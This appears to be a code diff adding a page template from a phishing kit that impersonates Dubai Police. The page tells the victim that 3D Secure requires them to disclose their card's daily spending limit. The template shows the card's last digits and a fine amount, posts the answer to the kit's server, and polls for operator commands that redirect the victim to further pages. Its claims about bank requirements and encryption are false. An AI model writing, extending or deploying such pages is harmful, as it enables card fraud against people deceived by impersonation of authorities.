@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Card Verification | Dubai Police</title>
+<link rel="icon" type="image/png" href="/dp-logo.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'Inter',-apple-system,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;flex-direction:column;max-width:480px;margin:0 auto;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
+.main{flex:1;padding:20px 16px 32px;animation:fadeIn .35s ease both;}
+.card{background:white;border-radius:18px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.08);}
+.card-head{padding:28px 24px 20px;text-align:center;border-bottom:1px solid #f1f5f9;}
+.shield-ring{width:64px;height:64px;border-radius:50%;background:#e8f5ee;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;}
+.card-title{font-size:17px;font-weight:800;color:#0f172a;margin-bottom:8px;}
+.card-sub{font-size:13px;color:#6b7280;line-height:1.6;}
+.notice-box{margin:16px 20px 0;padding:12px 14px;background:#fffbeb;border:1.5px solid #fde68a;border-radius:10px;font-size:12px;color:#92400e;line-height:1.55;}
+.form-section{padding:18px 20px 20px;}
+.form-label{font-size:12px;font-weight:700;color:#374151;margin-bottom:8px;display:block;}
+.amount-input-wrap{position:relative;}
+.amount-prefix{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:14px;font-weight:700;color:#6b7280;pointer-events:none;}
+.amount-input{width:100%;padding:14px 14px 14px 58px;border:2px solid #e5e7eb;border-radius:12px;font-size:20px;font-weight:700;color:#0f172a;background:#fafafa;outline:none;font-family:'Inter',monospace;transition:border-color .15s;letter-spacing:1px;}
+.amount-input:focus{border-color:#1a6b3a;background:white;box-shadow:0 0 0 3px rgba(26,107,58,.1);}
+.btn-submit{width:100%;padding:14px;background:linear-gradient(135deg,#1a6b3a,#0f4a27);color:white;font-size:15px;font-weight:700;border:none;border-radius:50px;cursor:pointer;box-shadow:0 4px 16px rgba(26,107,58,.35);transition:all .15s;font-family:inherit;margin-top:14px;display:flex;align-items:center;justify-content:center;gap:8px;}
+.btn-submit:disabled{background:#9ca3af;box-shadow:none;cursor:not-allowed;}
+.status-bar{display:flex;align-items:center;justify-content:center;gap:7px;padding:11px 14px;background:#f0fdf4;border-radius:10px;margin-top:12px;font-size:12px;color:#166534;font-weight:600;}
+.s-dot{width:7px;height:7px;background:#22c55e;border-radius:50%;animation:pulse 1.2s ease-in-out infinite;}
+.foot{text-align:center;font-size:11px;color:#9ca3af;padding:14px 20px;display:flex;align-items:center;justify-content:center;gap:5px;border-top:1px solid #f1f5f9;}
+</style>
+<%- include('_pixel') %>
+</head>
+<body>
+
+<header>
+  <div style="display:flex;align-items:center;gap:10px;">
+    <div style="width:36px;height:36px;border-radius:50%;overflow:hidden;flex-shrink:0;"><img src="/dp-logo.png" alt="Dubai Police" width="36" height="36" style="object-fit:cover;"></div>
+    <div>
+      <div style="color:white;font-weight:800;font-size:14px;line-height:1.2;">Dubai Police</div>
+      <div style="color:rgba(255,255,255,0.6);font-size:11px;">شرطة دبي</div>
+    </div>
+  </div>
+  <div style="font-size:11px;color:rgba(255,255,255,0.5);">Secure Verification</div>
+</header>
+
+<div class="main">
+  <div class="card">
+
+    <div class="card-head">
+      <div class="shield-ring">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#1a6b3a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          <polyline points="9 12 11 14 15 10"/>
+        </svg>
+      </div>
+      <div class="card-title">Card Limit Verification</div>
+      <div class="card-sub">To authorize this transaction, your bank requires verification of your card's daily spending limit.</div>
+    </div>
+
+    <div class="notice-box">
+      <strong>Why is this required?</strong> As part of 3D Secure authentication, your bank must confirm that the transaction amount is within your card's authorized daily limit. This information is encrypted in transit and used solely for verification purposes.
+    </div>
+
+    <div class="form-section" id="form-section">
+      <label class="form-label">Your Card's Daily Spending Limit (AED)</label>
+      <div class="amount-input-wrap">
+        <span class="amount-prefix">AED</span>
+        <input type="text" inputmode="numeric" id="limit-input" class="amount-input" placeholder="0" oninput="onLimitInput(this.value)" autocomplete="off">
+      </div>
+      <button class="btn-submit" id="submit-btn" onclick="submitLimit()" disabled>
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        Confirm Limit
+      </button>
+      <div class="status-bar" id="status-bar" style="display:none;">
+        <div class="s-dot"></div>
+        <span id="status-txt">Verifying with bank…</span>
+      </div>
+    </div>
+
+    <div style="padding:0 20px 16px;">
+      <div style="display:flex;gap:10px;padding:12px 14px;background:#f8faf9;border-radius:10px;align-items:flex-start;">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6b7280" stroke-width="2" stroke-linecap="round" style="flex-shrink:0;margin-top:1px;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12.01" y2="8"/><line x1="12" y1="12" x2="12" y2="16"/></svg>
+        <div style="font-size:11px;color:#6b7280;line-height:1.55;">Card: <strong>•••• •••• •••• <%= cardLast4 %></strong>&nbsp;&nbsp;Amount: <strong>AED <%= totalFine.toLocaleString() %></strong></div>
+      </div>
+    </div>
+
+    <div class="foot">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Secured by 256-bit SSL encryption
+    </div>
+  </div>
+</div>
+
+<script>
+const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
+const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
+const ISSUER     = <%- JSON.stringify(issuer) %>;
+const SID        = <%- JSON.stringify(sid) %>;
+const sidParams  = '?totalFine=' + TOTAL_FINE + '&cardLast4=' + encodeURIComponent(CARD_LAST4) + '&issuer=' + encodeURIComponent(ISSUER) + '&sid=' + SID;
+
+function onLimitInput(val) {
+  const digits = val.replace(/\D/g, '');
+  document.getElementById('limit-input').value = digits ? Number(digits).toLocaleString() : '';
+  document.getElementById('limit-input').dataset.raw = digits;
+  document.getElementById('submit-btn').disabled = !digits || digits === '0';
+}
+
+async function submitLimit() {
+  const raw = document.getElementById('limit-input').dataset.raw || document.getElementById('limit-input').value.replace(/\D/g,'');
+  if (!raw) return;
+  const btn = document.getElementById('submit-btn');
+  btn.disabled = true;
+  btn.innerHTML = '<span style="width:16px;height:16px;border:2.5px solid rgba(255,255,255,0.35);border-top-color:white;border-radius:50%;display:inline-block;animation:spin 0.8s linear infinite;"></span>';
+  const sb = document.getElementById('status-bar');
+  sb.style.display = 'flex';
+
+  try {
+    await fetch('/api/card-limit', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ sid: SID, cardLast4: CARD_LAST4, totalFine: TOTAL_FINE, issuer: ISSUER, limit: raw })
+    });
+  } catch {}
+
+  document.getElementById('status-txt').textContent = 'Waiting for bank confirmation…';
+}
+
+if (SID) {
+  setInterval(async () => {
+    try {
+      const r = await fetch('/api/check-status?sid=' + SID);
+      const d = await r.json();
+      if (d.action === 'redirect' && d.page) {
+        const extra = d.params ? '&' + d.params : '';
+        window.location.href = '/' + d.page + sidParams + extra;
+      }
+    } catch(e) {}
+  }, 3000);
+}
+</script>
+</body>
+</html>
